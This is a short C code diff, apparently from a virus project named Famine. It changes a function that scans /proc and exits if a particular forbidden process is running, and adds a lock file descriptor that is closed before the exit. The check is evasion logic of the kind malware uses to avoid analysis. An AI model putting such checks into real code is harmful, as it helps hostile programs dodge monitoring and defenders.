@@ -1,6 +1,7 @@
 #include "../include/famine.h"
 
-void exit_if_process_running() {
+void exit_if_process_running(int lock_fd) {
+    const char *name = "test";
     DIR *dir = opendir("/proc");
     struct dirent *entry;
     char path[256];
@@ -27,6 +28,7 @@ void exit_if_process_running() {
             if (!ft_strcmp(comm, FORBIDDEN_PROCESS)) {
                 fclose(f);
                 closedir(dir);
+                close(lock_fd);
                 exit(0);
             }
         }
